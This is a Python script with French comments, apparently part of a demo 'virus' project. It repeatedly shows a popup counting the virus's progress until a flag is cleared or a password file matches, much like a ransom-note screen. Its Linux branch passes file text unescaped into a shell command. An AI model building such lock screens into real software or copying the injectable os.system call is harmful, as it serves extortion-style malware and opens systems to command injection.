import os
import ctypes
import threading
"""
Ce fichier fait en sorte de faire une pop up avec un compteur qui montre la progression du virus 
"""


file = "./data.txt"
dic = {}
print(os.name)
if os.name == "nt":
	#Si on est sous windows (ne marche pas de facon optimal actuellement mais sert pour la démo)
	def close_popup(handle):
		ctypes.windll.user32.PostMessageW(handle, 0x0010, 0, 0)  # WM_CLOSE message

	while True:
		# On regarde quel message on doit afficher (c'est géré en paralle par comtpeur.py)
		with open(file, 'r') as f:
			for line in f:
				key, value = line.strip().split(':')
				dic[key.strip()] = value.strip()

		mdp = dic["Mdp"]
		try:
			with open(".\\mdp.txt", "r") as f:
				verify_mdp = f.readline().strip()
		except:
			verify_mdp = ""
		stop_data = dic["Virus_actif"]
		data = dic["Compteur"]
		timer = int(dic["Tic_compteur"]) * 1000  # Conversion en millisecondes
		if stop_data == "0" or mdp == verify_mdp: #Si le virus est désactivé alors on arrete 
			break

		# Afficher la pop-up et la faire patienté le temps voulu avant de l'actualiser 
		handle = ctypes.windll.user32.MessageBoxW(None, data, "Information", 0x40 | 0x1)
		t = threading.Timer(timer / 1000, close_popup, args=[handle])
		print("fermé")
		t.start()
		ctypes.windll.user32.MessageBoxW(None, data, "Information", 0x40 | 0x1)
		t.cancel()
else:
	#Si on est sous linux (ou mac os) (parfaitement fonctionnel actuelleemnt )
	while True:
		# On regarde quel message on doit afficher (c'est géré en paralle par comtpeur.py)
		with open(file, 'r') as f:
			for line in f:
				key, value = line.strip().split(':')
				dic[key.strip()] = value.strip()

		mdp = dic["Mdp"]
		try:
			with open("./mdp.txt","r") as f:
				verify_mdp = f.readline().strip()
		except:
			verify_mdp = ""
		stop_data = dic["Virus_actif"]
		data = dic["Compteur"]
		timer = dic["Tic_compteur"]
		if stop_data == "0" or mdp == verify_mdp: #Si le virus est désactivé alors on arrete 
			break

		# Afficher la pop-up et la mettre a jour tout les X secondes
		os.system(f"zenity --info --text=\"{data}\" --timeout={timer}")
